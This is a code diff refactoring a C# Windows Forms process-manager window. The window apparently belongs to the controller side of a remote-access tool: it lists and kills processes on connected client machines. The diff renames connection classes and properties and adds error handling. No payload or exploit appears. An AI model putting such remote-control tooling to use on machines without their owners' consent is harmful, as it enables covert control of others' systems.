@@ -9,23 +9,28 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 
 namespace Server.Forms
 {
     public partial class FormProcessManager : Form
     {
+        public Form1 F { get; set; }
+        internal Clients Client { get; set; }
+
         public FormProcessManager()
         {
             InitializeComponent();
         }
 
-        public Form1 F { get; set; }
-        internal Clients C { get; set; }
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-            if (!C.ClientSocket.Connected) this.Close();
+            try
+            {
+                if (!Client.TcpClient.Connected) this.Close();
+            }
+            catch { this.Close(); }
         }
 
         private async void killToolStripMenuItem_Click(object sender, EventArgs e)
@@ -40,7 +45,7 @@ namespace Server.Forms
                         msgpack.ForcePathObject("Packet").AsString = "processManager";
                         msgpack.ForcePathObject("Option").AsString = "Kill";
                         msgpack.ForcePathObject("ID").AsString = P.SubItems[lv_id.Index].Text;
-                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                     });
                 }
             }
@@ -53,7 +58,7 @@ namespace Server.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "processManager";
                 msgpack.ForcePathObject("Option").AsString = "List";
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             });
         }
     }
